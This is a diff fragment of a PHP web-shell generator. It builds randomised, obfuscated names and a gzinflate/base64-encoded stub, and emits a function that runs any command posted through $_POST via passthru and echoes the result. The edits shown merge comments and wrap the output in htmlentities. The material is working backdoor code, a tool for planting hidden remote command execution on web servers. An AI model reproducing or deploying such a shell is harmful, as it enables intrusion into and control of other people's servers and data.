@@ -8,16 +8,13 @@ if ( ! isset($_SERVER['TERM'])){
 
 
 function make_random_name(){
-
     // making some randomness
     $name = rand() * rand();
     $name = hash("whirlpool", $name);
     $name = crypt($name, rand());
 
-    // shorten
+    // shorten, rm leading numbers
     $name = preg_replace('~([\.\$/]|.{16}$)~', '', $name);
-
-    // rm leading numbers
     $name = preg_replace('/^[0-9]+/', '', $name);
 
     // make sure the regex didn't leave us an empty string
@@ -59,7 +56,7 @@ $%s = gzinflate(base64_decode("%s"));
 
 function %s($%s){
     echo "<%s>$ ".$%s."</%s><br>";
-    echo passthru($%s." 2>&1");
+    echo htmlentities(passthru($%s." 2>&1"), ENT_IGNORE);
 }
 @$%s=$_POST["%s"];
 echo preg_replace("/%s/", basename($_SERVER["SCRIPT_NAME"]), $%s);
